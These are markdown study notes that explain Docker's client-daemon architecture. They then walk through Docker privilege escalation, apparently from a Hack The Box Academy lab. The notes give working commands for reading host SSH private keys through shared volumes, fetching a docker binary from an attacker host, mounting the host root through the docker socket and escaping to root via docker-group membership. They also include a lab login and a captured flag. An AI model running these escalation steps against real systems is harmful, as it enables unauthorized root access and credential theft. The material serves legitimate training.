# Docker

## Docker Architecture

At the core of the Docker architecture lies a client-server model, where we have two primary components:

The Docker daemon
- running Docker containers
- interacting with Docker containers
- managing Docker containers on the host system.

The Docker client

Have the ability to create, start, stop, manage, remove containers, search, and download Docker images.

Another client for Docker is Docker Compose.

Docker image : blueprint or a template for creating containers. It encapsulates everything needed to run an application, including the application's code, dependencies, libraries, and configurations.

--> We can create images using a text file called a Dockerfile

Docker container is an instance of a Docker image

While images are immutable and read-only, while containers are mutable and can be modified during runtime

## Docker Privilege Escalation

### Docker Shared Directories

When using Docker, shared directories (volume mounts) can bridge the gap between the host system and the container's filesystem.

--> Shared directories can be mounted as read-only or read-write

root@container:~$ cd /hostsystem/home/cry0l1t3
root@container:/hostsystem/home/cry0l1t3$ ls -l

-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
-rw-r--r--  1 cry0l1t3 cry0l1t3    220 Jun 30 15:09 .bash_logout
-rw-r--r--  1 cry0l1t3 cry0l1t3   3771 Jun 30 15:09 .bashrc
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh


root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----

ssh cry0l1t3@<host IP> -i cry0l1t3.priv

### Docker Sockets

Docker daemon socket is a special file that allows us and processes to communicate with the Docker daemon.

htb-student@container:~/app$ ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock

--> use the docker to interact with the socket and enumerate what docker containers are already running

wget https://<parrot-os>:443/docker -O docker
chmod +x docker
ls -l

-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker

/tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
<SNIP>

Create our own Docker container that maps the host’s root directory (/) to the /hostsystem directory :

/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

/tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
<SNIP>

Log in to the new privileged Docker container with the ID 7ae3bcc818af and navigate to the /hostsystem :

/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
cat /hostsystem/root/.ssh/id_rsa

### Docker Group

id
uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)

docker image ls

REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB

### Docker Socket

docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
root@ubuntu:~# ls -l

## LAB

ssh htb-student@10.129.205.237
HTB_@cademy_stdnt!

id
uid=1001(htb-student) gid=1001(htb-student) groups=1001(htb-student),118(docker)

docker image ls
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
ubuntu       latest    5a81c4b8502e   7 months ago   77.8MB

docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@e0350a66ecc5:/# cat /root/flag.txt
HTB{D0ck3r_Pr1vE5c}
